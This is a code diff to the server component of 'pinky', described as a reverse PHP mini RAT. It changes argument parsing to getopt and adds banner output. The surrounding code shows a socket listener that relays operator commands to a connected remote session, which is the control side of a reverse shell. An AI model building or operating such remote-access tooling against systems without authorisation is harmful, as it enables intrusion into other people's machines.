@@ -5,12 +5,21 @@ $version = "0.1";
 $author = "David Tavarez (davidtavarez)";
 $url = "https://github.com/davidtavarez/pinky";
 
+echo chr ( 27 ) . chr ( 91 ) . 'H' . chr ( 27 ) . chr ( 91 ) . 'J';
 echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
 echo "(server)";
+echo $author . "\n";
+echo $url . "\n";
 
-$address = isset ( $argv [1] ) && ip2long ( $argv [1] ) ? $argv [1] : "0.0.0.0";
-$port = isset ( $argv [2] ) ? $argv [2] : 3391;
-$type = isset ( $argv [3] ) ? $argv [3] : 'tcp';
+$params = "a:";
+$params .= "p:";
+$params .= "t:";
+
+$options = getopt ( $params );
+
+$address = isset ( $options ['a'] ) ? $options ['a'] : '0.0.0.0';
+$port = isset ( $options ['p'] ) ? ( int ) $options ['p'] : 3391;
+$type = isset ( $options ['t'] ) ? $options ['t'] : 'tcp';
 
 echo "\nCreating server... ";
 $socket = stream_socket_server ( $type . '://' . $address . ':' . $port, $error_number, $error_message );
@@ -62,8 +71,8 @@ while ( $stop_server == false ) {
 	
 	while ( is_resource ( $session ) ) {
 		$input = fgets ( STDIN );
-		stream_socket_sendto( $session, $input);
-		$response = stream_socket_recvfrom( $session, 1024 );
+		stream_socket_sendto ( $session, $input );
+		$response = stream_socket_recvfrom ( $session, 1024 );
 		if (strlen ( $response ) > 0) {
 			echo $response;
 		}
